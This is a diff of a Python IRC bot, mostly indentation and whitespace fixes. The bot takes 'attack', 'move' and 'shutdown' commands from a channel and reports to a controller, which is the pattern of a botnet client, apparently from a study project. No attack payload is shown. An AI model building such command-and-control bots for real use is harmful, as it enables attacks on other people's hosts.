@@ -10,12 +10,7 @@ BUF_SIZE = 1024
 
 botName = ""
 
-
-
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-#arguments hostname port channel secret-phrase
-
 
 def startConn():
 
@@ -66,7 +61,7 @@ def listen(s):
                 elif msg[1] == "attack":
                     attack(msg[2], msg[3])
                 elif msg[1] == "move":
-					clientNick = prefix.split("!")
+                    clientNick = prefix.split("!")
                     print(clientNick[0])
                     break
                 elif msg[1] == "shutdown":
@@ -122,8 +117,8 @@ def attack(atkhost, atkport):
     #report back to controller
 
 def move(newhost, newport, newchan, clientNick):
-	reportmsg = "PRIVMSG %s %s moved" % (clientNick, PASS)
-	s.send(reportmsg.encode('utf-8'))
+    reportmsg = "PRIVMSG %s %s moved" % (clientNick, PASS)
+    s.send(reportmsg.encode('utf-8'))
     success = False
     s.send(("QUIT").encode('utf-8'))
     s.close()
@@ -143,11 +138,14 @@ def move(newhost, newport, newchan, clientNick):
         s2.connect((HOST, PORT))
     except:
         print("failed to move to new channel")  # we may want to handle a few more specific errors, this is general for now
-		sys.exit(1)
+        sys.exit(1)
 
         #join IRC
     usr = "USER %s %s %s :%s\r\n" % (botName, botName, botName, botName)
     s2.send(usr.encode('utf-8'))
+
+    #TODO : Need to check for nick collision
+
     nic = "NICK %s \r\n" % (botName)
     s2.send(nic.encode('utf-8'))
     chan = "JOIN %s\r\n" % (CHAN)
@@ -158,7 +156,6 @@ def move(newhost, newport, newchan, clientNick):
     #if failure, keep trying? or maybe stay on old IRC?
 
 def shutdown():
-    shutdownmsg = " disconnected" #needs to be formatted properly for a private message
     s.send(("QUIT").encode('utf-8'))
     sys.exit(0)
 
